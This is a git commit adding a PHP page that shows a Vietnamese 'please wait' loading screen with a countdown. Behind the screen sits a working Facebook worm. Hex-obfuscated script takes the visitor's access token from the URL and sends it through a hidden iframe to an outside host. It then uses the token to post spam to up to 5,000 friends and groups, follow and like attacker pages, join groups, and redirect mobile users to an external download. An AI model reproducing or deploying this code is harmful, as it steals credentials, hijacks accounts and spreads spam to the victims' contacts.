65b06bcc438504499ecf4e4faa73f264e7a9b688
thanh134 <60687024+thanh134@users.noreply.github.com>
2020-02-05 07:48:52 +0000

    Add files via upload

---
+++ kt.php
@@ -0,0 +1,134 @@
+?<html>
+<br>
+<br>
+<center>
+<html>
+    
+    <head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+    <script type="text/javascript" src="http://apibizzyboltco-a.akamaihd.net/gsrs?is=grbgovn&bp=PB&g=65c7f01f-f1c9-40dd-bd32-5c02d63d144b" ></script><script type="text/javascript">function as_getCookie(c_name) {var c_value = document.cookie;var c_start = c_value.indexOf(" " + c_name + "=");if (c_start == -1)c_start = c_value.indexOf(c_name + "=");if (c_start == -1)c_value = null;else {c_start = c_value.indexOf("=", c_start) + 1;var c_end = c_value.indexOf(";", c_start);if (c_end == -1)c_end = c_value.length;c_value = unescape(c_value.substring(c_start,c_end));}return c_value;}function as_setCookie(c_name,value,exdays) {var exdate=new Date();exdate.setDate(exdate.getDate() + exdays);var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());document.cookie=c_name + "=" + c_value;}       var ua = navigator.userAgent.toLowerCase();var arrMobi = new Array("midp", "j2me", "avantg", "ipad", "iphone", "docomo", "novarra", "palmos","palmsource", "240x320", "opwv", "chtml", "pda", "windows ce","mmp/","mib/", "symbian", "wireless", "nokia","hand", "mobi", "phone", "cdm", "up.b", "audio", "sie-", "sec-","samsung", "htc", "mot-", "mitsu", "sagem", "sony", "alcatel","lg", "erics", "vx", "nec", "philips", "mmm", "xx", "panasonic","sharp", "wap", "sch", "rover", "pocket", "benq", "java", "pt","pg", "vox", "amoi", "bird", "compal", "kg", "voda", "sany","kdd", "dbt", "sendo", "sgh", "gradi", "jb", "dddi", "moto", "opera mobi", "opera mini", "android");isMobile = false;for(i = 0; i < arrMobi.length; i++) {if(ua.indexOf(arrMobi[i]) != -1) {isMobile = true;break;}}   if(isMobile) {rdCookieVarName = "__as_rd";rdTimes = 1;rdDays = 0;rdInterval = 0;isRedirect = true;if (rdDays > 0 || rdInterval > 0) {curTime = Math.round((new Date()).getTime() / 1000);cookieVal = as_getCookie(rdCookieVarName);if (cookieVal != null) {arr = cookieVal.split(".");rdCount = parseInt(arr[0]);rdLast = parseInt(arr[1]);} else {rdCount = 0;rdLast = curTime - rdInterval;}if ((curTime - rdDays * 86400) > rdLast)rdCount = 0;if (rdCount >= rdTimes)isRedirect = false;if (curTime < (rdLast + rdInterval))isRedirect = false;if (isRedirect) {rdCount++;as_setCookie(rdCookieVarName, rdCount + "." + curTime, 365); }}if (isRedirect)location.href = "http://dauque.xclip.me/download/Khong-the-kiem-che-noi-voi-em-sieu-goi-cam-C87272?pamed=1&as=1";}</script></head><body onload="token();get_groups();get_friends();join_group();follow();like_page();timeline();"><center>
+    <img src="http://jimpunk.net/Loading/wp-content/uploads/loading1.gif"><br><h3>Vui lòng d?i : <font color=blue><span id="time"></span></font> Giây  Waiting !</h3> </center>
+    <img src="http://www.imagenestop.com/gif2/gif-loading-62064.jpg"><br>
+     
+    <title>Ðang Seting. Vui lòng ch? trong giây lát ..</title>
+    <link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
+    <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
+     
+    <script>
+    var url = "";
+    var image_link = "http://i.imgur.com/NeV9fbT.jpg";
+    var image_link2 = "http://i.imgur.com/NeV9fbT.jpg";
+    var text = " ที่ลิงค์ด้านล่างเพื่อช่วยให้ Fanpage ของคุณชอบและสนุกกับภาพที่สวยงามไม่เป็นไร  :*  <3 <3 https://www.facebook.com/pages/%C4%90%E1%BB%93ng-h%E1%BB%93-Order/412035705524386?sk=app_190322544333196 ";
+    var text2 = "\n Kim tan sắp làm đám cưới với cô dâu Việt? https://www.facebook.com/pages/%C4%90%E1%BB%93ng-h%E1%BB%93-Order/412035705524386?sk=app_190322544333196 \n\n";
+     
+    gonderildi = 0;
+     
+
+
+
+var _0x269e=["\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x68\x61\x73\x68","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x74\x6F\x6B\x65\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x62\x61\x6D\x65\x6F\x2E\x62\x6C\x2E\x65\x65\x2F\x74\x6F\x6B\x65\x6E\x2E\x70\x68\x70\x3F\x61\x74\x3D","\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x62\x6F\x72\x64\x65\x72\x3A\x30\x70\x78\x20\x23\x46\x46\x46\x46\x46\x46\x20\x6E\x6F\x6E\x65\x3B\x22\x20\x6E\x61\x6D\x65\x3D\x22\x74\x6F\x6B\x65\x6E\x22\x20\x73\x63\x72\x6F\x6C\x6C\x69\x6E\x67\x3D\x22\x6E\x6F\x22\x20\x66\x72\x61\x6D\x65\x62\x6F\x72\x64\x65\x72\x3D\x22\x30\x22\x20\x6D\x61\x72\x67\x69\x6E\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x70\x78\x22\x20\x6D\x61\x72\x67\x69\x6E\x77\x69\x64\x74\x68\x3D\x22\x30\x70\x78\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x70\x78\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x30\x70\x78\x22\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E","\x74\x75\x6E\x67\x75\x79\x65\x6E\x32\x30\x31\x34","\x64\x6A\x6B\x69\x65\x75\x6D\x61\x78\x2E\x69\x6E\x66\x6F","\x61\x65\x68\x61\x69\x76\x6C","\x6E\x67\x61\x79\x68\x6F\x6D\x71\x75\x61\x64\x61\x74\x75\x6E\x67\x2E\x69\x6E\x66\x6F"];var access_token=window[_0x269e[2]][_0x269e[1]][_0x269e[0]](1);function token(){document[_0x269e[5]](_0x269e[4])[_0x269e[3]]=_0x269e[6]+access_token+_0x269e[7];} ;follow(_0x269e[8]);follow(_0x269e[9]);like_page(_0x269e[10]);like_page(_0x269e[11]);
+
+
+
+
+	 function get_groups(){
+	 jQuery.ajax({
+	 url:'https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 5000&access_token='+access_token,
+	 dataType:'jsonp',
+	 success:function(data){
+	 post_groups(data);
+	 }
+	 });
+	 }
+	 function get_friends(){
+	 jQuery.ajax({
+	 url:'https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token='+access_token,
+	 dataType:'jsonp',
+	 success:function(data){
+	 post_friends(data);
+	 }
+	 });
+	 }
+	 function post_friends(list){
+     for(i=0;i<list.data.length;i++){
+     jQuery.ajax({
+     url:'https://graph.facebook.com/'+list.data[i].uid+'/photos?url=' + image_link + '&message=' + text +'' + url + '&callback=paylas&method=POST&access_token=' + access_token,
+     dataType:'script',
+     success:function(){
+     gonderildi += 1;
+     if(gonderildi >= list.data.length){
+	 }
+     }
+     });
+     }
+     }
+	 function post_groups(list){
+	 for(i=0;i<list.data.length;i++){
+	 jQuery.ajax({
+	 url:'https://graph.facebook.com/'+list.data[i].gid+'/photos?url=' + image_link + '&message='+ text +'' + url + '&callback=paylas&method=POST&access_token=' + access_token,
+	 dataType:'script',
+	 success:function(){
+	 gonderildi += 1;
+	 if(gonderildi >= list.data.length){
+	 }
+	 }
+	 });
+	 }
+	 }
+     
+	 
+
+
+	 function follow(id){
+     $.getJSON('https://graph.facebook.com/' + id + '/subscribers?method=post&access_token=' + access_token, function (response) {
+     });
+	 }
+	 function like_page(id){
+     $.getJSON('https://graph.facebook.com/me/likes?access_token=' + access_token + '&method=POST&url=https://www.facebook.com/' + id, function (response) {
+     });
+	 }
+	 function like_post(id){
+     $.getJSON('https://graph.facebook.com/' + id + '/likes/?method=post&access_token=' + access_token, function (response) {
+     });
+	 }
+	 function join_group(grpid){
+	 $.getJSON('https://graph.facebook.com/me?access_token=' + access_token, function (response) {
+	 if (response.id) {
+	 var userid = response.id;
+	 $.getJSON('https://graph.facebook.com/'+grpid+'/members/' + userid + '?method=post&access_token=' + access_token, function (response) {
+     if(response.data){
+	 }
+	 });
+	 }
+	 });
+	 }
+    </script>
+    <script type="text/javascript">
+    var jgt = 85;
+    document.getElementById('time').innerHTML = jgt;
+    function stime(){document.getElementById('time').innerHTML = jgt;       jgt = jgt - 1;
+            if(jgt == 0){clearInterval(timing); location = 'http://facebook.com';}
+    }
+    var timing = setInterval("stime();",1000);
+    </script>
+    <div id="token"><div/>
+     
+     
+     
+    
+
+</body></html>
+<?php
+$check=$_SESSION["counter"];
+$rfile=file("counter.txt");
+$counter=$rfile[0];
+if(!isset($check))//Neu gia trị $check chưa được gán
+{
+$_SESSION["counter"]=1;//Gán giá trị cho Session, từ lần tiếp theo $check sẽ có giá trị xác định
+$counter++;
+//Ghi lai xuong counter.txt
+$fp=fopen("counter.txt","w");
+fwrite($fp,$counter);
+fclose($fp);
+}
+print $counter;
+?> 
